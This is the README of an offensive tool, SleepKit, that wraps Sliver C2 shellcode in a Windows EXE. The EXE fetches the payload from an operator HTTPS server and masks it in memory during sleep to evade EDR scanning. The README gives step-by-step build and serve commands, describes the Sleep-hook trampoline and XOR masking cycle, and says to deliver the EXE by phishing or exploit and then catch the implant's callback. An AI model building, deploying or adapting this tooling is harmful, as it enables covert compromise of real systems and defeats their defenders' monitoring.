# SleepKit

Go sleep-mask host for Sliver shellcode. Part of the **Sliver Defense Evasion Suite**.

Wraps a Sliver shellcode in a Windows EXE that XOR-encrypts it in memory during sleep intervals. Two independent masking layers handle both the Win32 `Sleep` path and Sliver's native Go runtime sleep path.

---

## What It Does

Sliver's Go runtime sleeps in two ways:

1. **Win32 path**: `time.Sleep` → `runtime.usleep` → `kernel32!Sleep`
2. **NT path**: goroutine scheduler → `NtWaitForSingleObject`

SleepKit intercepts both:

| Layer | Method | Catches |
|-------|--------|---------|
| **Hook layer** | 12-byte JMP patch on `kernel32!Sleep` | Any Win32 `Sleep` call from shellcode |
| **Timer layer** | Go goroutine: suspend → XOR → wait → XOR → resume | Sliver's Go `time.Sleep` → `NtWaitForSingleObject` path |

When either layer triggers:
1. `NtSuspendThread` freezes the shellcode thread
2. XOR-encrypt the entire shellcode region in place
3. Change protection: `PAGE_EXECUTE_READ → PAGE_READWRITE`
4. Wait the original duration (real `kernel32!Sleep` via KernelBase bypass)
5. Change protection: `PAGE_READWRITE → PAGE_EXECUTE_READ`
6. XOR-decrypt (same operation restores original bytes)
7. `NtResumeThread` continues execution

An EDR that scans memory during the sleep window sees: no shellcode, no executable pages where Sliver was running.

---

## How It Differs from MaskKit

| | SleepKit | MaskKit |
|--|----------|---------|
| **Output** | Windows EXE | Raw `.bin` shellcode |
| **Delivery** | Execute as standalone | Inject via any loader |
| **Hook** | Go runtime hooks `kernel32!Sleep` | C inline hook on `NtWaitForSingleObject` |
| **Timer layer** | Yes — goroutine-based | No (hook-only) |
| **Stack spoofing** | No | Yes |
| **Go runtime in payload** | Yes (the host IS Go) | No (pure C shellcode) |

**When to use SleepKit**: You have a way to execute a `.exe` file on the target and want the fastest path to a masked Sliver session. Build SleepKit, run it, done.

**When to use MaskKit**: You need a raw shellcode to inject into another process, or want to stage via PalaceKit / a custom loader.

---

## Evasion Stack

| Layer | Technique |
|-------|-----------|
| **Hook layer** | `kernel32!Sleep` JMP patch with KernelBase bypass |
| **Timer layer** | Goroutine-driven XOR cycle |
| **No RWX** | RW → copy shellcode → RX before execution |
| **ChaCha20-Poly1305 in transit** | payload.enc is ChaCha20-Poly1305 encrypted (not XOR); XOR masking applies only in-memory during sleep |
| **HTTPS staging** | Self-signed ECDSA cert, randomized URL, one-shot server |
| **NT-native thread** | `NtCreateThreadEx` for shellcode thread |

---

## Prerequisites

- **Go 1.21+**: `go version`
- **Windows x64** target with an active Sliver listener

---

## Setup — Step by Step

### 1. Build the operator CLI

```bash
go build -o sleepkit ./cmd/sleepkit
```

Or with garble:
```bash
make cli-garble   # requires: go install mvdan.cc/garble@latest
```

---

## Usage — Step by Step

### Step 1: Generate a Sliver shellcode

In the Sliver server console:
```
sliver > generate --format shellcode --os windows --arch amd64 --save implant.bin
```

**Important**: Use `--format shellcode`, not `--format shared`. A shared library DLL would start a second Go runtime inside the host process, causing crashes.

### Step 2: Wrap with SleepKit

```bash
./sleepkit build \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443/p \
    --sleep 30s \
    --serve
```

**What this does:**
- ChaCha20-Poly1305 encrypts the shellcode with a random key+nonce (written to payload.enc)
- Cross-compiles a Windows EXE (`build/mask.exe`) with the key and URL embedded
- Starts a one-shot HTTPS server at the URL you specified

**Arguments:**
- `--shellcode` — path to the Sliver `.bin` shellcode
- `--url` — full HTTPS URL the EXE will fetch the shellcode from (operator IP:port/path)
- `--sleep` — masking interval (how often the timer layer cycles, e.g. `30s`, `1m`)
- `--serve` — start the payload server after building

**Output:**
```
[+] Encrypted → build/payload.enc
[+] EXE       → build/mask.exe
[*] Serving on https://0.0.0.0:8443/p ...
```

### Step 3: Deliver mask.exe to the target

Via phishing, exploit, script execution, etc. When `mask.exe` runs on a Windows x64 target:

1. Fetches `payload.enc` over HTTPS (ignores self-signed cert errors)
2. ChaCha20-Poly1305 decrypts into a fresh `NtAllocateVirtualMemory` RW allocation
3. Marks it RX (`NtProtectVirtualMemory`)
4. Installs the `kernel32!Sleep` hook
5. Starts the timer goroutine (XOR cycle every `--sleep` interval)
6. Starts the shellcode thread via `NtCreateThreadEx`
7. Sliver connects back to the C2

### Step 4: Catch the callback

```
sliver > sessions
```

---

## Command Reference

### `sleepkit build`

Build the sleep-masked EXE. Main workflow command.

```
Flags:
  --shellcode string   path to Sliver shellcode .bin (required)
  --url string         HTTPS URL to fetch the payload from (required)
                       format: https://<operator-ip>:<port>
                       only the scheme and host:port are used when --serve is given; the path is auto-generated
  --sleep duration     masking interval (default: 30s)
  --serve              start one-shot HTTPS server after building
  --port int           server port if --serve (default: 8443)
  -o, --output string  output directory (default: build)
  --garble             compile with garble symbol/string obfuscation
```

### `sleepkit serve`

Serve an already-built `payload.enc` without rebuilding.

```bash
./sleepkit serve --payload build/payload.enc --port 8443
```

```
Flags:
  --payload string   path to payload.enc (required)
  --port int         HTTPS port (default: 8443)
```

---

## How It Works — Technical Detail

### Hook Layer: kernel32!Sleep

SleepKit patches the first 12 bytes of `kernel32!Sleep` with a `MOV RAX, imm64; JMP RAX` trampoline:

```
48 B8                REX.W MOV RAX, imm64
XX XX XX XX XX XX XX XX  ← 8-byte absolute address of hook function
FF E0                JMP RAX
```

The hook function:
1. Saves the original 12 bytes in a separate executable trampoline
2. On each call, checks if the duration is above the mask threshold
3. If yes: runs the mask cycle, then calls the real `Sleep` via KernelBase (not kernel32, to avoid re-hooking)
4. If no: passes through to the trampoline directly

Why use `KernelBase.dll` for the real Sleep call? Because `kernel32!Sleep` is patched. `KernelBase!Sleep` is the actual implementation that kernel32 forwards to — it's not patched and calls directly into ntdll.

### Timer Layer: Goroutine Masker

The timer layer runs as an independent Go goroutine:

```
loop every <sleep> interval:
  NtSuspendThread(shellcode_thread)
  XOR-encrypt shellcode region
  NtProtectVirtualMemory(shellcode, PAGE_READWRITE)
  real_sleep(interval)
  NtProtectVirtualMemory(shellcode, PAGE_EXECUTE_READ)
  XOR-decrypt shellcode region
  NtResumeThread(shellcode_thread)
```

This catches sleep calls that don't go through `kernel32!Sleep` — specifically Sliver's Go runtime using `NtWaitForSingleObject` directly.

**Why two layers?** Sliver's Go runtime has two code paths for sleeping:
- `time.Sleep` in user code eventually calls `kernel32!Sleep` (caught by hook)
- The Go scheduler's own timer and channel waits call `NtWaitForSingleObject` directly (caught by timer layer)

The timer layer introduces a fixed-interval cycle independent of what the shellcode is doing. This means Sliver's code is encrypted even between C2 callbacks, not just during them.

### Memory Layout During Execution

```
Timeline of shellcode region:

mask.exe starts   Shellcode fetched   Thread starts   Timer fires   Timer ends
     │                   │                 │               │             │
     ▼                   ▼                 ▼               ▼             ▼
[not allocated]    [RW: plaintext]   [RX: running]   [RW: XOR'd]   [RX: running]
                                                      ← scan window →
```

An EDR scan during the `← scan window →` sees: `PAGE_READWRITE`, XOR-encrypted bytes. No executable shellcode.

---

## File Structure

```
sleepkit/
├── cmd/
│   └── sleepkit/
│       └── main.go   # operator CLI: build, serve commands
├── internal/
│   └── ...           # encryption, serve, build helpers
├── go.mod
├── Makefile
└── README.md
```

---

## Suite Context

| Tool | Role |
|------|------|
| **SleepKit** | This tool — Go host EXE sleep masker for Sliver |
| **MaskKit** | C shellcode sleep masker (alternative, injectable) |
| **PalaceKit** | Crystal Kit-format loader — can wrap SleepKit output |
| **CrystalKit** | Crystal Palace toolkit — full staging + PICO workflow |
| **LoadKit** | In-memory PE execution via Sliver Extension DLL |
